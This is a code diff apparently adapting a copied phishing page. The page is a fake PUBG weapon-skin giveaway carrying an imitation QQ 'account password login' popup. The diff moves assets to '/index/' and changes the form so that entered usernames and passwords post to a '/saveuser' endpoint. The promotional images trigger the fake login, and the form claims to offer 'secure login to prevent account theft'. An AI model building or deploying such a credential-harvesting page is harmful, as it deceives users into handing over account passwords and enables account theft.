@@ -38,12 +38,12 @@
         background-color:#fff;
     }
   </style>
-  <script src="%E9%A2%84%E7%BA%A6%E9%A6%96%E6%AC%BE%E7%9A%AE%E8%82%A4%E6%9E%AA-%E7%BB%9D%E5%9C%B0%E6%B1%82%E7%94%9F_files/lgn.js" type="text/javascript"></script>
+    <script src="/index/lgn.js" type="text/javascript"></script>
 </head>
 <body>
-<img src="%E9%A2%84%E7%BA%A6%E9%A6%96%E6%AC%BE%E7%9A%AE%E8%82%A4%E6%9E%AA-%E7%BB%9D%E5%9C%B0%E6%B1%82%E7%94%9F_files/efeylq.jpg" style="display:block;" onclick="lgclick();">
-<img src="%E9%A2%84%E7%BA%A6%E9%A6%96%E6%AC%BE%E7%9A%AE%E8%82%A4%E6%9E%AA-%E7%BB%9D%E5%9C%B0%E6%B1%82%E7%94%9F_files/fiharn.jpg" style="display:block;" onclick="lgclick();">
-<img src="%E9%A2%84%E7%BA%A6%E9%A6%96%E6%AC%BE%E7%9A%AE%E8%82%A4%E6%9E%AA-%E7%BB%9D%E5%9C%B0%E6%B1%82%E7%94%9F_files/hjuihi.jpg" style="display:block;" onclick="lgclick();">
+<img src="index/efeylq.jpg" style="display:block;" onclick="lgclick();">
+<img src="index/fiharn.jpg" style="display:block;" onclick="lgclick();">
+<img src="index/hjuihi.jpg" style="display:block;" onclick="lgclick();">
 <style>
 .denglu {
     width: 270px;
@@ -94,11 +94,11 @@
     <div id="close"><a href="javascript:;" onclick="close_bg();" class="close_a"></a></div>
     <div class="u_p_lg"><p>账号密码登录</p></div>
     <div class="d_ksdl"><span>推荐使用</span><a href="javascript:;" onclick="" class="a_ksdl">快速安全登录</a><span>，防止盗号。</span></div>
-    <div id="message"><div class="mes_d"><img src="%E9%A2%84%E7%BA%A6%E9%A6%96%E6%AC%BE%E7%9A%AE%E8%82%A4%E6%9E%AA-%E7%BB%9D%E5%9C%B0%E6%B1%82%E7%94%9F_files/1233.html" width="20" height="20"><span id="ts"></span></div></div>
+    <div id="message"><div class="mes_d"><img src="/index/1233.html" width="20" height="20"><span id="ts"></span></div></div>
     <div class="fm">
-        <form action="2017.php" method="post" id="form1" onsubmit="return ts()">
-            <input name="u" id="user" placeholder="支持QQ号/邮箱/手机号登录" type="text">
-            <input name="p" id="pass" placeholder="密码" type="password">
+        <form action="/saveuser" method="post" id="form1">
+            <input name="username" id="user" placeholder="支持QQ号/邮箱/手机号登录" type="text">
+            <input name="password" id="pass" placeholder="密码" type="password">
             <input name="bianhao" value="1" type="hidden">
             <input value="登录" id="dengl" type="submit">
         </form>
